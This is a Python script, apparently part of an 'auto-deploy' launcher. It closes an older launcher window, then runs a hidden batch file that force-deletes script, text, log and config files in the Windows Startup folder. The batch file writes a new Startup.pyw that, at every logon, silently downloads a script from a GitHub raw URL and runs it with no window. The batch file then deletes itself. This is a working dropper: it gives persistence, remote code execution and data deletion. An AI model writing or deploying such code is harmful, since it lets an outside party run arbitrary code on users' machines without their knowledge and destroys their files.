# monitor_script.py - Forces old launcher to exit, then cleans up
import os
import sys
import subprocess
import tempfile
import time

def exit_old_launcher():
    """Make the old launcher exit by closing its window"""
    try:
        # Try to hide the old launcher's console first
        import win32gui
        import win32con
        
        # Get all windows and close the one that looks like our launcher
        def enum_windows_callback(hwnd, extra):
            try:
                title = win32gui.GetWindowText(hwnd)
                if "GitHub Auto-Deploy Launcher" in title or "Press Enter to close" in title:
                    # Send close message
                    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                    time.sleep(0.5)
            except:
                pass
        
        win32gui.EnumWindows(enum_windows_callback, None)
        
    except:
        pass

def cleanup_and_create():
    """Main cleanup and creation function"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # First, exit the old launcher
    exit_old_launcher()
    
    # Wait a bit for it to exit
    time.sleep(2)
    
    # Create a batch file that runs after Python exits
    batch_script = f'''@echo off
:: Wait for any Python processes to finish
timeout /t 5 /nobreak >nul

:: Go to startup folder
cd /d "{startup_folder}"

:: Delete ALL files
echo Deleting all files...
del /f /q startup_log.txt 2>nul
del /f /q monitor_script.py 2>nul
del /f /q *.log 2>nul
del /f /q *.txt 2>nul
del /f /q *.py 2>nul
del /f /q *.pyw 2>nul
del /f /q *.json 2>nul
del /f /q *.pyc 2>nul
del /f /q *.bat 2>nul

:: Delete __pycache__
for /d %%d in (__pycache__) do (
    rmdir /s /q "%%d" 2>nul
)

:: Create the new launcher DIRECTLY
echo Creating new launcher...

:: Write the launcher code directly
echo import os, sys, subprocess, urllib.request, tempfile, time > "Startup.pyw"
echo. >> "Startup.pyw"
echo def run_script(): >> "Startup.pyw"
echo     try: >> "Startup.pyw"
echo         url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py" >> "Startup.pyw"
echo         code = urllib.request.urlopen(url).read().decode('utf-8') >> "Startup.pyw"
echo         tf = tempfile.gettempdir() + "/script_temp.py" >> "Startup.pyw"
echo         with open(tf, "w") as f: f.write(code) >> "Startup.pyw"
echo         si = subprocess.STARTUPINFO() >> "Startup.pyw"
echo         si.dwFlags ^|= subprocess.STARTF_USESHOWWINDOW >> "Startup.pyw"
echo         subprocess.Popen([sys.executable, tf], startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW) >> "Startup.pyw"
echo         time.sleep(5) >> "Startup.pyw"
echo         try: os.remove(tf) >> "Startup.pyw"
echo         except: pass >> "Startup.pyw"
echo         return True >> "Startup.pyw"
echo     except: return False >> "Startup.pyw"
echo. >> "Startup.pyw"
echo if __name__ == "__main__": >> "Startup.pyw"
echo     time.sleep(5) >> "Startup.pyw"
echo     run_script() >> "Startup.pyw"
echo     while True: time.sleep(3600) >> "Startup.pyw"

:: Verify
echo Files in startup:
dir /b

:: Start the new launcher
echo Starting new launcher...
start /b "" pythonw "Startup.pyw"

echo Done! Only Startup.pyw remains.
timeout /t 2 /nobreak >nul
del "%~f0" 2>nul
'''
    
    # Save batch file to Windows temp folder (not user temp)
    batch_path = os.path.join(os.getenv('WINDIR'), 'Temp', 'cleanup_final.bat')
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run the batch file in a NEW process
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    subprocess.Popen(
        ['cmd', '/c', batch_path],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    
    print("✓ Cleanup scheduled. Old launcher will close.")
    print("✓ New launcher will be created in 5 seconds.")
    
    # Exit immediately
    sys.exit(0)

def main():
    print("=" * 60)
    print("FINAL CLEANUP - CREATING NEW LAUNCHER")
    print("=" * 60)
    cleanup_and_create()

if __name__ == "__main__":
    main()
